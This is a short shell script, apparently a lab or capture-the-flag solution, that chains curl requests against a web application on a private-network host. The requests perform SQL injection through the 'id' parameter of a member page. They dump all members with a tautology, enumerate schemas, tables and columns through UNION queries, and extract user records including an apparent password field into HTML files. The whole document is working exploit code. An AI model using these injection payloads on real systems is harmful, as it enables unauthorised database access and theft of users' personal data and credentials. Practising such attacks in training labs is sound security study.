curl "http://192.168.56.101/?page=member&id=1 OR 1=1--&Submit=Submit#" > allmembers.html \
&& \
curl "http://192.168.56.101/?page=member&id=1 UNION ALL SELECT NULL, schema_name FROM information_schema.schemata--&Submit=Submit#" > databases.html \
&& \
curl "http://192.168.56.101/?page=member&id=1 UNION ALL SELECT NULL, table_name FROM information_schema.tables--&Submit=Submit#" > tables.html \
&& \
curl "http://192.168.56.101/?page=member&id=1 UNION ALL SELECT NULL, column_name FROM information_schema.COLUMNS--&Submit=Submit#" > columns.html \
&& \
curl "http://192.168.56.101/?page=member&id=1 UNION ALL SELECT NULL, concat(user_id,0x3a,first_name,0x3a,last_name,0x3a,town,0x3a,country,0x3a,planet,0x3a,Commentaire,0x3a,countersign) FROM users--&Submit=Submit#" > datas.html
